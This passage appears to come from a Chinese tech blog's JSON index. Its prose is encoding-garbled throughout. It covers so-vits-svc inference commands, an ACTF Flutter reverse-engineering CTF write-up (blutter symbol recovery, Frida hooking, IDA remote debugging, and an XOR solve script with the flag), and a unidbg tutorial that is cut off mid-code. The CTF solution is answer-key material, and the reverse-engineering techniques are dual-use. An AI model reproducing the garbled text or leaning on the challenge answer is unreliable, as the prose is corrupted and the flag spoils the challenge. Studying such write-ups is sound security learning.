å”±å‡ºå•ç›¸æ€ï¼Œé‚£ä¹ˆæœ‰ä¼´å¥æ˜¯è‚¯å®šä¸è¡Œæ»´ï¼Œæˆ‘ä»¬éœ€è¦å°†äººå£°å’Œä¼´å¥åˆ†ç¦» # UVR5 è¿™é‡Œéœ€è¦ä½¿ç”¨åˆ°çš„å·¥å…·æ˜¯ Ultimate Vocal Remover 5 (UVR5), å¹¶ä¸‹è½½å¯¹åº”çš„å¤„ç†æ¨¡å‹ã€‚ å¯ä»¥å‰å¾€è¿™ä¸ªç½‘ç«™æŸ¥çœ‹æ¨¡å‹çš„å¾—åˆ† ä¸€äº›æ¨èçš„å¤„ç†æ¨¡å‹å’ŒåŠŸèƒ½å¦‚ä¸‹ï¼š Demucs | MDX23C : åˆ†ç¦»äººå£°åŠä¼´å¥ VR Architecture - 5_HP-Karaoke-UVR : åˆ†ç¦»å’Œå£° VR Architecture - UVR-DeEcho-DeReverb : å»é™¤æ··å“å’Œå›å£° å¯ä»¥å…ˆä½¿ç”¨ Demucs | MDX23C æ¥åˆ†ç¦»äººå£°åŠä¼´å¥ï¼Œå¦‚æœå¬åˆ°äººå£°æœ‰å’Œå£°çš„è¯ï¼Œå¯ä»¥ç”¨ VR Architecture - 5_HP-Karaoke-UVR æ¥äºŒæ¬¡å¤„ç† å½“ç„¶ï¼Œä¸ºäº†æ–¹ä¾¿ä¹Ÿå¯ä»¥ç›´æ¥å» b ç«™æ‰¾åˆ°åˆ«äººåˆ†ç¦»å¥½çš„äººå£°ç”¨å•¦ï½ # æ¨ç† å¯¼å‡ºæ¨ç†æ¨¡å‹ï¼šæ–‡æœ¬ç¼–ç å™¨ï¼ŒFlow ç½‘ç»œï¼ŒDecoder ç½‘ç»œï¼›åˆ¤åˆ«å™¨å’ŒåéªŒç¼–ç å™¨ç­‰åªåœ¨è®­ç»ƒä¸­ä½¿ç”¨ python svc_export.py --config configs/base.yaml --checkpoint_path chkpt/sovits5.0/sovits5.0_0***.pt æ¨ç† å¦‚æœä¸æƒ³æ‰‹åŠ¨è°ƒæ•´ f0ï¼Œåªéœ€è¦æœ€ç»ˆçš„æ¨ç†ç»“æœï¼Œè¿è¡Œä¸‹é¢çš„å‘½ä»¤å³å¯ python svc_inference.py --config configs/base.yaml --model sovits5.0.pth --spk ./data_svc/singer/ä¿®æ”¹æˆå¯¹åº”çš„åç§°.npy --wave test.wav --shift 0 å¦‚æœéœ€è¦æ‰‹åŠ¨è°ƒæ•´ f0ï¼Œä¾æ®ä¸‹é¢çš„æµç¨‹æ“ä½œ ä½¿ç”¨ whisper æå–å†…å®¹ç¼–ç ï¼Œç”Ÿæˆ test.ppg.npy python whisper/inference.py -w test.wav -p test.ppg.npy ä½¿ç”¨ hubert æå–å†…å®¹ç¼–ç ï¼Œç”Ÿæˆ test.vec.npy python hubert/inference.py -w test.wav -v test.vec.npy æå– csv æ–‡æœ¬æ ¼å¼ F0 å‚æ•°ï¼Œç”¨ Excel æ‰“å¼€ csv æ–‡ä»¶ï¼Œå¯¹ç…§ Audition æˆ–è€… SonicVisualiser æ‰‹åŠ¨ä¿®æ”¹é”™è¯¯çš„ F0 python pitch/inference.py -w test.wav -p test.csv æœ€ç»ˆæ¨ç† python svc_inference.py --config configs/base.yaml --model sovits5.0.pth --spk ./data_svc/singer/ä¿®æ”¹æˆå¯¹åº”çš„åç§°.npy --wave test.wav --ppg test.ppg.npy --vec test.vec.npy --pit test.csv --shift 0 ä¸€äº›æ³¨æ„ç‚¹ å½“æŒ‡å®šâ€“ppg åï¼Œå¤šæ¬¡æ¨ç†åŒä¸€ä¸ªéŸ³é¢‘æ—¶ï¼Œå¯ä»¥é¿å…é‡å¤æå–éŸ³é¢‘å†…å®¹ç¼–ç ï¼›æ²¡æœ‰æŒ‡å®šï¼Œä¹Ÿä¼šè‡ªåŠ¨æå– å½“æŒ‡å®šâ€“vec åï¼Œå¤šæ¬¡æ¨ç†åŒä¸€ä¸ªéŸ³é¢‘æ—¶ï¼Œå¯ä»¥é¿å…é‡å¤æå–éŸ³é¢‘å†…å®¹ç¼–ç ï¼›æ²¡æœ‰æŒ‡å®šï¼Œä¹Ÿä¼šè‡ªåŠ¨æå– å½“æŒ‡å®šâ€“pit åï¼Œå¯ä»¥åŠ è½½æ‰‹å·¥è°ƒæ•™çš„ F0 å‚æ•°ï¼›æ²¡æœ‰æŒ‡å®šï¼Œä¹Ÿä¼šè‡ªåŠ¨æå– ç”Ÿæˆæ–‡ä»¶åœ¨å½“å‰ç›®å½• svc_out.wav args â€“config â€“model â€“spk â€“wave â€“ppg â€“vec â€“pit â€“shift name é…ç½®æ–‡ä»¶ æ¨¡å‹æ–‡ä»¶ éŸ³è‰²æ–‡ä»¶ éŸ³é¢‘æ–‡ä»¶ ppg å†…å®¹ hubert å†…å®¹ éŸ³é«˜å†…å®¹ å‡é™è°ƒ å»å™ªåå¤„ç† python svc_inference_post.py --ref test.wav --svc svc_out.wav --out svc_out_post.wav","categories":[],"tags":[]},{"title":"flutteré€†å‘ ACTF native app","slug":"flutter-ACTF-native-app","date":"2023-10-31T10:04:59.000Z","updated":"2023-10-31T11:59:11.391Z","comments":true,"path":"flutter-ACTF-native-app/","link":"","permalink":"https://oacia.dev/flutter-ACTF-native-app/","excerpt":"","text":"# å‰è¨€ ç®—äº†ä¸€ä¸‹å¥½é•¿æ—¶é—´æ²¡æ‰“è¿‡ CTF äº†ï¼Œå‰ä¸¤å¤©çœ‹åˆ° ACTF é€†å‘æœ‰é“ flutter é€†å‘é¢˜å°±è¿‡æ¥ç©ç©å•¦ï¼ŒèŠ±äº†ä¸€ä¸ªä¸‹åˆåšå®Œäº†ã€‚è¯´æ¥ä¹Ÿå·§ï¼Œæˆ‘ç»™ DASCTF åæœˆèµ›å‡ºçš„é€†å‘é¢˜å…¶ä¸­ä¸€é“ä¹Ÿæ˜¯ flutter, ä¸è¿‡é‚£é¢˜æˆ‘éš¾åº¦é™çš„ç›¸å½“ä¹‹ä½å•¦ï¼Œä¸çŸ¥é“æœ‰å¤šå°‘äººåšå‡ºæ¥äº†å‘¢ï½ # è¿˜åŸå‡½æ•°å flutter é€†å‘çš„ä¸€å¤§éš¾ç‚¹å°±æ˜¯ä¸çŸ¥é“ libapp.so çš„å‡½æ•°åï¼Œè™½ç„¶æœ‰å·¥å…· reflutter å¯ä»¥å¸®åŠ©æˆ‘ä»¬å¾—åˆ°å…¶ä¸­çš„ç¬¦å·ï¼Œä½†æ˜¯æˆ‘ä¸ªäººè®¤ä¸ºåŸºäºå¯¹ libflutter.so æºç æ’æ¡©åé‡ç¼–è¯‘å†é‡æ‰“åŒ… apk çš„æ–¹å¼å…·æœ‰æå¤§çš„ä¸å¯é¢„æ–™æ€§ï¼Œææœ‰å¯èƒ½å¯¼è‡´ apk é—ªé€€ï¼Œè¿™ä¸€é¢˜ä¾¿å‡ºç°äº†è¿™ç§æƒ…å†µï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘å°†ä»‹ç»çš„å·¥å…· blutter æ˜¯çº¯é™æ€åˆ†ææ¥è¿˜åŸå‡½æ•°åï¼Œæ›´ä»¤äººæƒŠå–œçš„æ˜¯å®ƒæä¾›äº† IDApython è„šæœ¬æ¥è®©æˆ‘ä»¬å¯ä»¥åœ¨ IDA ä¸­å¯¹å‡½æ•°è¿›è¡Œé‡å‘½åï¼Œè€Œè¿™ä¸ªé¡¹ç›®ä¸­æä¾›çš„å…¶ä»–æ–‡ä»¶ä¹Ÿç›¸å½“å¥½ç”¨ # blutter çš„ç¼–è¯‘åŠä½¿ç”¨ blutter é¡¹ç›®åœ°å€ https://github.com/worawit/blutteråœ¨å„ä¸ªå¹³å°å¦‚ä½•ç¼–è¯‘åœ¨è¿™ä¸ªé¡¹ç›®çš„ README.md ä¸­å†™çš„å·²ç»ç›¸å½“è¯¦ç»†äº†ï¼Œè¿™é‡Œæˆ‘å°±ç®€å•ä»‹ç»ä¸€ä¸‹ Windows ä¸Šçš„ç¼–è¯‘è¿‡ç¨‹å§ï¼Œæ³¨æ„ä¸€ä¸‹è¿™äº›å‘½ä»¤éœ€è¦å…¨ç¨‹è¿è¡Œåœ¨ä»£ç†ç¯å¢ƒå¦åˆ™ä¼šå¯¼è‡´æ— æ³•ä¸‹è½½ é¦–å…ˆ clone é¡¹ç›® git clone https://github.com/worawit/blutter --depth=1éšåè¿è¡Œåˆå§‹åŒ–è„šæœ¬ cd .\\blutter\\python .\\scripts\\init_env_win.pyè¯·æ³¨æ„ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦æ‰“å¼€ x64 Native Tools Command Prompt , å®ƒå¯ä»¥åœ¨ Visual Studio æ–‡ä»¶å¤¹ä¸­æ‰¾åˆ° ç„¶åè¿è¡Œ blutter.py å¹¶æä¾› libapp.so å’Œ libflutter.so çš„æ–‡ä»¶å¤¹è·¯å¾„ä»¥åŠè¾“å‡ºæ–‡ä»¶å¤¹è·¯å¾„ python .\\blutter.py ..\\chall\\lib\\arm64-v8a\\ .\\output è¾“å‡ºæ–‡ä»¶å¤¹ç›®å½•å¦‚ä¸‹ éšåæˆ‘ä»¬ç”¨ ida åç¼–è¯‘ libapp.so , å¹¶è¿è¡Œè¾“å‡ºæ–‡ä»¶å¤¹ä¸­çš„ IDApython è„šæœ¬ ida_script/addNames.py , ç¬¦å·å°±è¢«å…¨éƒ¨æ¢å¤å‡ºæ¥å•¦ # hook å…³é”®å‡½æ•° è·å–å‡½æ•°å‚æ•° è¿™é‡Œæˆ‘ä»¬éœ€è¦å…³æ³¨çš„å‡½æ•°æ˜¯ flutter_application_1_main__LongPressDemoState::_onTap , å› ä¸ºåœ¨ flutter çš„å¼€å‘ä¸­ï¼ŒonTap å‡½æ•°æ˜¯æŒ‰é’®ç‚¹å‡»ä¹‹åçš„å“åº”å‡½æ•° éšåæˆ‘ä»¬è¿›å…¥ sub_1DE500 , åœ¨è¯¥å‡½æ•°ä¸­åŒå‡» sub_1DE59C è¿›å…¥ åœ¨è¿™ä¸ªå‡½æ•°ä¸­æˆ‘ä»¬å‘ç°äº† 256 , % , ^ è¿™äº›ç‰¹å¾ï¼Œåˆç†çŒœæµ‹ä¸€ä¸‹ç®—æ³•å¯èƒ½æ˜¯ RC4 æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨è¾“å‡ºæ–‡ä»¶å¤¹ä¸­çš„ blutter_frida.js hook ä¸€ä¸‹ sub_1DE59C çœ‹çœ‹æƒ…å†µ PS D:\\hgame\\ACTF\\native app\\work\\blutter> frida -U -f \"com.example.flutter_application_1\" -l .\\output\\blutter_frida.js[Pixel 3::com.example.flutter_application_1 ]-> Unhandle class id: 46, TypeArgumentsGrowableList@6d00488c29 = [ 188676, 0, &#123; \"key\": \"Unhandle class id: 46, TypeArguments\" &#125;, 34, &#123; \"key\": [ 184, 132, 137, 215, 146, 65, 86, 157, 123, 100, 179, 131, 112, 170, 97, 210, 163, 179, 17, 171, 245, 30, 194, 144, 37, 41, 235, 121, 146, 210, 174, 92, 204, 22 ] &#125;, 0, 0, 0]è¿™é‡Œæˆ‘ä»¬åª hook åˆ°ä¸€ä¸ªæ•°ç»„çš„å€¼ï¼Œå¦ä¸€ä¸ªæ•°ç»„çš„ç±»å‹æ˜¯ TypeArguments , ç ”ç©¶äº†ä¸€ä¸‹ blutter_frida.js åå‘ç°ä½œè€…è¿˜æ²¡æœ‰å¯¹è¿™ç§æ•°æ®ç±»å‹æ ¼å¼æä¾› hook æ”¯æŒ # IDA åŠ¨æ€è°ƒè¯• libapp.so ç°åœ¨æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªæ•°ç»„ï¼Œæˆ‘ä»¬å°±æš‚æ—¶è®¤ä¸ºå®ƒå°±æ˜¯ flag ç»è¿‡åŠ å¯†ä¹‹åå¾—åˆ°çš„ç»“æœï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åœ¨ IDA ä¸­å¯¹ sub_1DE59C ä¸‹æ–­ç‚¹åŠ¨æ€è°ƒè¯•æ¥æ›´åŠ æ·±å…¥çš„ç ”ç©¶ä¸€ä¸‹ é¦–å…ˆæˆ‘ä»¬éœ€è¦å°† IDA æ–‡ä»¶å¤¹ä¸­çš„ dbgsrv/android_server64 push åˆ°æ‰‹æœºä¸Šé¢ï¼Œç„¶åè¿è¡Œä¸€ä¸‹å¹¶ä¸”æŒ‡å®šç«¯å£ blueline:/data/local/tmp # ./as64 -p 11112IDA Android 64-bit remote debug server(ST) v7.7.27. Hex-Rays (c) 2004-2022Listening on 0.0.0.0:11112...éšåç«¯å£è½¬å‘ä¸€ä¸‹ PS C:\\Users\\oacia> adb forward tcp:11112 tcp:1111211112åœ¨ IDA ä¸­é€‰æ‹©è°ƒè¯•å™¨ä¸º Android debugger éšåç‚¹å‡» Debugger-&gt;Debugger options... é€‰æ‹©å¦‚ä¸‹é…ç½® ç‚¹å‡» Debugger-&gt;Process options... , Hostname ä¿®æ”¹ä¸º 127.0.0.1 , Port ä¿®æ”¹ä¸º 11112 ç„¶åç‚¹å‡» Debugger-&gt;Attach to process... , é™„åŠ åˆ°æˆ‘ä»¬ç›®æ ‡åŒ…åçš„è¿›ç¨‹ä¸Šé¢ å¼¹å‡ºè¯¥å¼¹çª—é€‰æ‹© Same å³å¯ åœ¨æ‰‹æœºä¸Šç‚¹å‡»æŒ‰é’®ï¼Œç„¶ååœ¨ IDA ä¸­ç‚¹å‡»è¿™ä¸ªç»¿è‰²çš„å‰ªå¤´ï¼Œå°±å¯ä»¥åŠ¨æ€è°ƒè¯•å•¦ åœ¨åŠ¨æ€è°ƒè¯•ä¹‹åï¼ŒæœªçŸ¥çš„å˜é‡ä¹Ÿé€æ¸æµ®ç°äº†å‡ºæ¥ï¼Œè¿™é‡Œæˆ‘ä»¬å‘ç°äº† v28&gt;=256 , é‚£ä¹ˆå¾ˆæœ‰å¯èƒ½å°±æ˜¯ RC4 äº†å“¦ æ—¢ç„¶è¿™æ ·ï¼Œé‚£ä¹ˆç›´æ¥åœ¨è¿™é‡Œå”¯ä¸€çš„å¼‚æˆ–çš„åœ°æ–¹ç”¨ IDA å» trace ä¸€ä¸‹ï¼ŒæŠŠå¼‚æˆ–çš„æ•°ç»„ dump ä¸‹æ¥ä¸å°±è¡Œäº†ï¼š) äºæ˜¯æˆ‘ä»¬å¾—åˆ°äº†è¢«å¼‚æˆ–çš„æ•°ç»„äº† ä½†æ˜¯åœ¨å¼‚æˆ–è¿ç®—çš„åœ°æ–¹ä¸‹æ–­ç‚¹ä¹‹åï¼Œæˆ‘è¾“å…¥çš„æ•°å…¨éƒ½æ˜¯ 1 , è¿™é‡Œè¢«å¼‚æˆ–çš„æ•°ä¹Ÿå…¨æ˜¯ 0xce æ‰€ä»¥è«éä¸æ˜¯ RC4? è®© 0xce å’Œ 0x31 å¼‚æˆ–ä¸€ä¸‹çœ‹çœ‹ï¼Œç«Ÿç„¶æ˜¯ 0xff è¿™ä¹ˆæœ‰æ„ä¹‰çš„æ•°å­— æ‰€ä»¥ exp ä¹Ÿå°±èƒ½å†™å‡ºæ¥å•¦ï½ final = [184, 132, 137, 215, 146, 65, 86, 157, 123, 100, 179, 131, 112, 170, 97, 210, 163, 179, 17, 171, 245, 30, 194, 144, 37, 41, 235, 121, 146, 210, 174, 92, 204, 22]xor = [14, 14, 68, 80, 29, 201, 241, 46, 197, 208, 123, 79, 187, 55, 234, 104, 40, 117, 133, 12, 67, 137, 91, 31, 136, 177, 64, 234, 24, 27, 26, 214, 122, 217]flag = [chr(xor[i]^final[i]^0xff) for i in range(len(final))]print(''.join(flag))# Iu2xpwXLAK734btEt9kXIhfpRgTlu6KuI0","categories":[],"tags":[]},{"title":"unidbg usage","slug":"unidbg-usage","date":"2023-10-26T09:26:55.000Z","updated":"2023-11-01T12:31:39.672Z","comments":true,"path":"unidbg-usage/","link":"","permalink":"https://oacia.dev/unidbg-usage/","excerpt":"","text":"# ä¸‹è½½åœ°å€ https://github.com/zhkl0228/unidbg æºç ä¸‹è½½å®Œæˆåä½¿ç”¨ IDEA æ‰“å¼€å³å¯ä½¿ç”¨ # å¿«é€Ÿä½¿ç”¨ å¥—ç”¨ä»¥ä¸‹æ¨¡æ¿ï¼Œå°†åŒ…åç­‰å‚æ•°æ›¿æ¢æˆå¯¹åº”çš„å­—ç¬¦ä¸²å³å¯å¿«é€Ÿä½¿ç”¨ unidbg package com.oacia;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.Module;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.DalvikModule;import com.github.unidbg.linux.android.dvm.VM;import com.github.unidbg.memory.Memory;import java.io.File;public class Myunidbg &#123; private final AndroidEmulator emulator; private final VM vm; private DalvikModule dm; private Module module; public Myunidbg() &#123; // åˆ›å»ºæ¨¡æ‹Ÿå™¨ emulator = AndroidEmulatorBuilder .for64Bit() /* hypervisor å¼•æ“å¯ä»¥åœ¨æ­è½½äº† Apple Silicon èŠ¯ç‰‡çš„è®¾å¤‡ä¸Šæ¨¡æ‹Ÿæ‰§è¡Œ KVM å¼•æ“å¯ä»¥åœ¨æ ‘è“æ´¾ä¸Šæ¨¡æ‹Ÿæ‰§è¡Œ Dynarmic å¼•æ“æ˜¯ä¸ºäº†æ›´å¿«çš„æ¨¡æ‹Ÿæ‰§è¡Œ Unicorn æ˜¯æœ€å¼ºå¤§æœ€å®Œå–„çš„æ¨¡æ‹Ÿæ‰§è¡Œå¼•æ“ï¼Œä½†å®ƒçš„ç¼ºç‚¹æ˜¯æ…¢ */ .addBackendFactory(new Unicorn2Factory(true)) .setProcessName(\"com.oacia.test\") .build(); // è·å–æ“ä½œå†…å­˜çš„æ¥å£ Memory memory = emulator.getMemory(); // è®¾ç½® andorid ç³»ç»Ÿåº“ç‰ˆæœ¬ memory.setLibraryResolver(new AndroidResolver(26)); // åˆ›å»ºè™šæ‹Ÿæœº vm = emulator.createDalvikVM(); // å¼€å¯ log vm.setVerbose(true); // åŠ è½½ç›®æ ‡åº“ dm = vm.loadLibrary(new File(\"E:\\\\oacia\\\\libtprt.so\"), false); module = dm.getModule(); // æ‰§è¡Œ JNIOnLoadï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ dm.callJNI_OnLoad(emulator); &#125; public static void main(String[] args) &#123; &#125;&#125;å¦‚æœè¿è¡Œæ—¶æç¤ºç¼ºå°‘æŸäº›åº“ï¼Œå¯ä»¥åœ¨åŠ è½½ç›®æ ‡åº“å‰æ·»åŠ å¦‚ä¸‹ä»£ç é¢„åŠ è½½ç¼ºå°‘çš„ç³»ç»Ÿåº“ï¼Œç³»ç»Ÿåº“çš„ä½ç½®ä½äº /system/lib64/ , å°†è¿™äº›ç³»ç»Ÿåº“ä»æ‰‹æœºå¤åˆ¶åˆ°ç”µè„‘ä¸Šå³å¯ vm.loadLibrary(new File(\"f:\\\\androidlib\\\\libc.so\"),false);vm.loadLibrary(new File(\"f:\\\\androidlib\\\\libm.so\"),false);vm.loadLibrary(new File(\"f:\\\\androidlib\\\\libstdc++.so\"),false);vm.loadLibrary(new File(\"f:\\\\androidlib\\\\ld-android.so\"),false);vm.loadLibrary(new File(\"f:\\\\androidlib\\\\libdl.so\"),false);å¦‚æœåœ¨ JNI å±‚ä¸­è°ƒç”¨äº† java å±‚ä¸­çš„å‡½æ•°ï¼ŒåŒæ ·ä¼šå¼•èµ· unidbg å¼•æ“æŠ¥é”™ï¼Œæ­¤æ—¶éœ€è¦è‡ªè¡Œè¡¥å……ç¼ºå¤±çš„ java å±‚çš„æ–¹æ³•ï¼Œå¹¶é‡å†™è°ƒç”¨ Java å±‚å‡½æ•°æ—¶ç”¨åˆ°çš„ JNI æ–¹æ³•ï¼Œç¼ºå°‘å˜é‡çš„æƒ…å†µåŒç† ä¸¾ä¸ªä¾‹å­ï¼Œåœ¨è¿™ä¸ª JNI å‡½æ•°ä¸­è°ƒç”¨äº† java å±‚ä¸­ base64 è¿™ä¸ªæ–¹æ³• æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ unidbg çš„ Java æ–‡ä»¶ä¸­è¡¥å……ä¸Šå¯¹åº”çš„æ–¹æ³• public class MainActivitymethod1 extends AbstractJni &#123; private static DvmClass MainActivityClass; @Override /* * base64 æ˜¯ java å±‚çš„æ–¹æ³•ï¼Œè¿™é‡Œé‡å†™ callObjectMethodV æ–¹æ³•ï¼šä¸€æ—¦å‘ç°è°ƒç”¨çš„æ˜¯ java å±‚çš„ base64 æ–¹æ³•ï¼Œè¿™é‡Œå°±ç”¨è‡ªå·±å¤ç°çš„ base64 æ–¹æ³•æ›¿æ¢ * */ public DvmObject&lt;?> callObjectMethodV(BaseVM vm, DvmObject&lt;?> dvmObject, String signature, VaList vaList) &#123; System.out.println(\"callObjectMethodV->\"+signature); if(signature.equals(\"com/example/testjni/MainActivity->base64(Ljava/lang/String;)Ljava/lang/String;\"))&#123; DvmObject dvmobj=vaList.getObjectArg(0); String arg= (String) dvmobj.getValue(); String result=base64(arg); return new StringObject(vm,result); &#125; return super.callObjectMethodV(vm, dvmObject, signature, vaList); &#125; @Override /* * staticcontent æ˜¯ java å±‚çš„é™æ€å˜é‡ï¼›getStaticObjectFieldï¼Œä¸€æ—¦æ£€æµ‹åˆ° so å±‚å¼•ç”¨è¿™ä¸ªå˜é‡ï¼Œé‚£ä¹ˆè‡ªå·±è¿”å›è¿™ä¸ªå˜é‡çš„å€¼ * */ public DvmObject&lt;?> getStaticObjectField(BaseVM vm, DvmClass dvmClass, String signature) &#123; System.out.println(\"getStaticObjectField->\"+signature); if(signature.equals(\"com/example/testjni/MainActivity->staticcontent:Ljava/lang/String;\"))&#123; return new StringObject(vm,\"staticcontent\");// æºç  public static string staticcontent = \"staticcontent\" &#125; return super.getStaticObjectField(vm, dvmClass, signature); &#125; @Override /* * objcontent æ˜¯ java å±‚çš„å˜é‡ï¼›è¿™é‡Œé‡å†™ getObjectField æ–¹æ³•ï¼Œä¸€æ—¦æ£€æµ‹åˆ° so å±‚å¼•ç”¨è¿™ä¸ªå˜é‡ï¼Œé‚£ä¹ˆè‡ªå·±è¿”å›è¿™ä¸ªå˜é‡çš„å€¼ * */ public DvmObject&lt;?> getObjectField(BaseVM vm, DvmObject&lt;?> dvmObject, String signature) &#123; System.out.println(\"getObjectField->\"+signature); if(signature.equals(\"com/example/testjni/MainActivity->objcontent:Ljava/lang/String;\"))&#123; return new StringObject(vm,\"objcontent\");//public string objcontent &#125; return super.getObjectField(vm, dvmObject, signature); &#125; /* * java å±‚çš„æ–¹æ³•ï¼Œè¿™é‡Œéœ€è¦å¤ç°ï¼Œå¦åˆ™ä¸çŸ¥é“æ€ä¹ˆæ‰§è¡Œ * */ public String base64(String arg3) &#123; String result=Base64.encodeBase64String(arg3.getBytes()); return result; &#125; &#125;# AndroidEmulator æ“ä½œ public void AndroidEmulator_use()&#123; // è·å–å†…å­˜æ“ä½œæ¥å£ Memory memory = emulator.getMemory(); // è·å–è¿›ç¨‹ pid int pid = emulator.getPid(); // åˆ›å»ºè™šæ‹Ÿæœº VM dalvikVM = emulator.createDalvikVM(); // åˆ›å»ºè™šæ‹Ÿæœºå¹¶æŒ‡å®š APK æ–‡ä»¶ VM dalvikVM = emulator.createDalvikVM(new File(\"E:/oacia/my.apk\")); // è·å–å·²åˆ›å»ºçš„è™šæ‹Ÿæœº VM dalvikVM = emulator.getDalvikVM(); // æ˜¾ç¤ºå½“å‰å¯„å­˜å™¨çŠ¶æ€ å¯æŒ‡å®šå¯„å­˜å™¨ emulator.showRegs(); // è·å–åç«¯ CPU Backend backend = emulator.getBackend(); // è·å–è¿›ç¨‹å String processName = emulator.getProcessName(); // è·å–å¯„å­˜å™¨ RegisterContext context = emulator.getContext(); //Trace è¯»å†…å­˜ emulator.traceRead(1,0); //Trace å†™å†…æ¶¦ emulator.traceWrite(1,0); //Trace æ±‡ç¼– emulator.traceCode(1,0); // æ˜¯å¦æ­£åœ¨è¿è¡Œ boolean running = emulator.isRunning();&#125;# Memory æ“ä½œ public void Memory_use()&#123; Memory memory = emulator.getMemory(); // æŒ‡å®š Android SDK ç‰ˆæœ¬ memory.setLibraryResolver(new AndroidResolver(23)); // æ‹¿åˆ°ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘å†…å­˜åœ°å€ï¼Œé€šè¿‡è¯¥æŒ‡é’ˆå¯æ“ä½œå†…å­˜ UnidbgPointer pointer = memory.pointer(0x4000000); // è·å–å½“å‰å†…å­˜æ˜ å°„æƒ…å†µ Collection&lt;MemoryMap> memoryMap = memory.getMemoryMap(); // æ ¹æ®æ¨¡å—åæ¥æ‹¿åˆ°æŸä¸ªæ¨¡å— Module module = memory.findModule(\"module name\"); // æ ¹æ®åœ°å€æ‹¿åˆ°æŸä¸ªæ¨¡å— Module module = memory.findModuleByAddress(0x40000000);&#125;# VM æ“ä½œ public void VM_use()&#123; // æ¨èæŒ‡å®š APK æ–‡ä»¶ï¼ŒUnidbg ä¼šè‡ªåŠ¨åšè®¸å¤šå›ºå®šçš„æ“ä½œ VM vm = emulator.createDalvikVM(new File(\"E:\\\\oacia\\\\my.apk\")); // æ˜¯å¦è¾“å‡º JNI è¿è¡Œæ—¥å¿— vm.setVerbose(true); // åŠ è½½ SO æ¨¡å— å‚æ•°äºŒè®¾ç½®æ˜¯å¦è‡ªåŠ¨è°ƒç”¨ init å‡½æ•° DalvikModule dalvikModule = vm.loadLibrary(new File(\"E:\\\\oacia\\\\libc.so\"), true); // è®¾ç½® JNI äº¤äº’æ¥å£ å‚æ•°éœ€å®ç° Jni æ¥å£ï¼Œæ¨èä½¿ç”¨ this ç»§æ‰¿ AbstractJni vm.setJni(this); // è·å– JNIEnv æŒ‡é’ˆï¼Œå¯ä½œä¸ºå‚æ•°ä¼ é€’ Pointer jniEnv = vm.getJNIEnv(); // è·å– JavaVM æŒ‡é’ˆï¼Œå¯ä½œä¸ºå‚æ•°ä¼ é€’ Pointer javaVM = vm.getJavaVM(); // è°ƒç”¨ JNI_OnLoad å‡½æ•° vm.callJNI_OnLoad(emulator,dalvikModule.getModule()); // å‘ VM æ·»åŠ å…¨å±€å¯¹è±¡ï¼Œè¿”å›è¯¥å¯¹è±¡çš„ hash å€¼ int hash = vm.addGlobalObject(dvmObj); // è·å–è™šæ‹Ÿæœºä¸­çš„å¯¹è±¡ï¼Œå‚æ•°ä¸ºè¯¥å¯¹è±¡çš„ hash å€¼ DvmObject&lt;?> object = vm.getObject(hash);&#125;# æ–¹æ³•è°ƒç”¨ # è°ƒç”¨å¯¼å‡ºå‡½æ•° // è°ƒç”¨å¯¼å‡ºå‡½æ•°public void call_export_function()&#123; Module oacia_module = vm.loadLibrary(new File(\"E:/oacia/liboacia.so\"),false).getModule(); Number result = oacia_module.callFunction(emulator,\"_Z3addii\", 1,2); System.out.println(\"_Z3addii result:\"+result.intValue());&#125;# è°ƒç”¨ JNI å‡½æ•° // è°ƒç”¨ JNI å‡½æ•°public void call_JNI_function()&#123; // è°ƒç”¨ jni å‡½æ•°ï¼Œå¯¹äºåŠ¨æ€æ³¨å†Œçš„ jni å‡½æ•°å¿…é¡»åœ¨å®Œæˆåœ°å€çš„ç»‘å®šæ‰èƒ½è°ƒç”¨ DvmClass MainActivity_dvmclass = vm.resolveClass(\"com/example/unicorncourse08/MainActivity\");// å…ˆæŠŠç±»æ‰¾åˆ°ï¼Œè¿™é‡Œçš„åŸç†å¾ˆåƒåå°„ DvmObject&lt;?> resultobj = MainActivity_dvmclass.callStaticJniMethodObject(emulator,\"stringFromJNI1(Ljava/lang/String;)Ljava/lang/String;\",\"helloworld\");// å†é€šè¿‡ç±»å»è°ƒç”¨é‡Œé¢çš„å‡½æ•° System.out.println(\"resultobj:\"+resultobj);&#125;# è°ƒç”¨ä»»æ„å‡½æ•° // è°ƒç”¨ä»»æ„å‡½æ•°public void call_any_function()&#123; // è·å– JNIEnv * Pointer jniEnv = vm.getJNIEnv(); // åˆ›å»º jobject å¯¹è±¡ DvmObject&lt;?> thiz = vm.resolveClass(\"com.oacia.test\").newObject(null); // å‡†å¤‡å…¥å‚ List&lt;Object> args = new ArrayList&lt;>(); args.add(jniEnv); args.add(vm.addLocalObject(thiz)); args.add(vm.addLocalObject(new StringObject(vm,\"XuE\"))); // æ ¹æ®åœ°å€è°ƒç”¨ Number numbers = module.callFunction(emulator, 0x9180 + 1, args.toArray()); System.out.println(numbers.intValue());&#125;# è°ƒç”¨å½¢å‚æ˜¯æŒ‡é’ˆç±»å‹çš„å‡½æ•° // è°ƒç”¨å½¢å‚æ˜¯æŒ‡é’ˆç±»å‹çš„å‡½æ•°// å‡è®¾æˆ‘ä»¬éœ€è¦è°ƒç”¨çš„å‡½æ•°ä¸º void md5 (const uint8_t *initial_msg, size_t initial_len, uint8_t *digest);// å…¶ä¸­ initial_msg å’Œ digest éƒ½æ˜¯æŒ‡é’ˆç±»å‹public void call_argv_point_type_function()&#123; String initial = \"unidbg\"; int initial_length = initial.length(); // å¼€è¾Ÿä¸€å—çš„ç©ºé—´æ¥å­˜æ”¾ç¬¬ä¸€ä¸ªå‚æ•° MemoryBlock initial_msg = emulator.getMemory().malloc(initial_length+1, false); UnidbgPointer initial_msg_ptr = initial_msg.getPointer(); // å°†å‚æ•° 1 å†™å…¥ initial_msg_ptr.write(initial.getBytes()); // å¼€è¾Ÿä¸€å— 16 å­—èŠ‚çš„ç©ºé—´æ¥å­˜æ”¾ç¬¬ 2 ä¸ªå‚æ•° MemoryBlock digest = emulator.getMemory().malloc(16, false); UnidbgPointer 